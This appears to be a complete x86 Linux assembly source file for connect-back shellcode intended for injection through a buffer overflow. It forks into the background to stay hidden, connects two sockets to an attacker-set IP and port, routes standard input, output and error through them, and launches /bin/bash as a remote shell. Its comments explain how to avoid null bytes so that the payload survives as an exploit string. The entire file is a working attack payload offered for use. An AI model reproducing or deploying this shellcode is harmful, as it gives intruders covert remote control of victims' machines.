#(c)Gildo
#release, use this for exploit as a string

#.global _start
.global main

#NOTE: if you need, think to pass the IP (not really needed) and port as 
#subtraction of 2 number, so you can not have a '\0' 
#that will terminate you exploiting string

#TODO: put the IP and PORT numbers that you'll use (always in network format)

#for debug
#as client.s -o client.o --symdef DEBUG=1&&cc client.o -o client&&client 
#release
#as client.s -o client.o &&ld -e main client.o -o client&&client

.equ PORT, 0x5246  #0x5246=port 18002 ;0x5000=htons(port 80)  [symbolic]
.equ ADDR, 0x0100007f  #0x0100007f=htonl(127.0.0.1)  [symbolic]
.equ CODE_SPACE,0xffff    #so my stack won't overwrite my code
#NOTE: CODE_SPACE must be bigger then size of buffer to overflow too
.equ STACK, 52         #space between ebp and esp 

main:
#_start:
	xorl %eax,%eax
	mov $CODE_SPACE,%ax
	subl %eax,%esp
	xorl %eax,%eax
	movl %esp,%ebp
	movb $STACK,%al
	subl %eax,%esp   #stack
    fork: #so the exploit works in background and nobody see it
	xorl %ebx,%ebx
	movb $2,%al
	int $0x80        #fork
	cmp %eax,%ebx
	jz end_fork
	movl %ebx,%eax
	inc %eax
	int $0x80        #exit in the main process
    end_fork:	

    ##create socket sock_in
	xorl %eax,%eax  
	push %eax        #protocol
	push $1          #SOCK_STREAM
	push $2          #AF_INET
	subl %ebx,%ebx
	incl %ebx        #mov $1,%ebx      #SYS_SOCKET <linux/net.h>
	mov %esp,%ecx    #args
	xorl %eax,%eax
	mov $102,%al     #socketcall
	int $0x80        #socketcall
	movl %eax,-4(%ebp)       ### -4(%ebp)=sock_in fd

    ##create socket sock_out
	xorl %eax,%eax  
	mov $102,%al     #socketcall
	int $0x80        #socketcall
	movl %eax,-8(%ebp)       ### -8(%ebp)=sock_out fd

    .ifdef DEBUG2
	push %eax
	push $str1
	call printf
	addl $8,%esp
    .endif
    
    ##create struct sockaddr_in for the server +from -24(%ebp to -9(%ebp
	xorl %eax,%eax
	movb $2,%al
	movw %ax,-24(%ebp)      #AF_INET
	movw $PORT,-22(%ebp)    #PORT
	movl $ADDR,-20(%ebp)    #ADDR

    ##create struct with args for connect +from -36(%ebp to -25(%ebp
	movl -8(%ebp),%eax      #sock_out
	movl %eax,-36(%ebp)     ### -36(%ebp)=sock_out/sock_in
	lea -24(%ebp),%eax
	movl %eax,-32(%ebp)     ### -32(%ebp)=struct sockaddr_in server
	xorl %eax,%eax
	movb $16,%al
	movl %eax,-28(%ebp)     ### -28(%ebp)=sizeof(sockaddr_in)=16

    ##connect *sock_out* to server
	xorl %eax,%eax
	movl %eax,%ebx
	lea -36(%ebp),%ecx     #args
	movb $3,%bl             #SYS_CONNECT <linux/net.h>
	movb $102,%al           #socketcall
	int $0x80               #socketcall

    .ifdef DEBUG
	pushl %eax
	pushl $str2
	call printf
	addl $8,%esp
    .endif

    ##connect *sock_in* to server
	movl -4(%ebp),%eax      #get sock_in fd
	movl %eax,-36(%ebp)     #put the sock_in fd into struct with args
	xorl %eax,%eax
	movl %eax,%ebx
	lea -36(%ebp),%ecx      #args
	movb $3,%bl             #SYS_CONNECT <linux/net.h>
	movb $102,%al           #socketcall
	int $0x80               #socketcall

    .ifdef DEBUG
	pushl %eax
	pushl $str3
	call printf
	addl $8,%esp
    .endif

    #now close stdin and connect (fcntl55)to sock_in
	xorl %eax,%eax
	xorl %ebx,%ebx   #0=stdin
	movb $6,%al
	int $0x80     #close stdin
	xorl %eax,%eax
	movl -4(%ebp),%ebx  #sock_in
	movl %eax,%ecx  #F_DUPFD
	movl %eax,%edx  #arg 0
	movb $55,%al
	int $0x80
	
    #now close stdout and connect (fcntl55)to sock_out
	xorl %eax,%eax
	xorl %ebx,%ebx 
	incl %ebx     
	movb $6,%al
	int $0x80     #close stdout
	xorl %eax,%eax
	movl -8(%ebp),%ebx  #sock_out
	movl %eax,%ecx  #F_DUPFD
	movl %eax,%edx  #arg 0
	movb $55,%al
	int $0x80
	
    #now close stderr and connect (fcntl55)to sock_out
	xorl %eax,%eax
	xorl %ebx,%ebx 
	incl %ebx
	incl %ebx    #2=stderr
	movb $6,%al
	int $0x80     #close stdin
	xorl %eax,%eax
	movl -8(%ebp),%ebx  #sock_in
	movl %eax,%ecx  #F_DUPFD
	movl %eax,%edx  #arg 0
	movb $55,%al
	int $0x80
	

	
    #execve the shell
execve:
	xorl %eax,%eax
	movb $0x68,%al
	push %eax        #"h\0"
	push $0x7361622f #"/bas"
	push $0x6e69622f #"/bin"
	movl %esp,%ebx   #path
	xorl %eax,%eax
	push %eax        #argv[1]=0
	push %ebx        #argv[0]
	movl %esp,%ecx   #argv
	#movl %esp,%edx   #env
	leal 4(%esp),%edx #env
	#xorl %edx,%edx #env
	movb $11,%al
	int $0x80          #execve
   quit:
	xorl %ebx,%ebx
	movl %ebx,%eax
	inc %eax
	int $0x80             #exit

#############end of code


.ifdef DEBUG2
  str1: .ascii "\neax is %d\n\0"
.endif
.ifdef DEBUG
  str2: .ascii "connect sock_out return %d\n\0"
  str3: .ascii "connect sock_in return %d\n\0"
  str8: .ascii "ohoh\0oh\n\0"
.endif

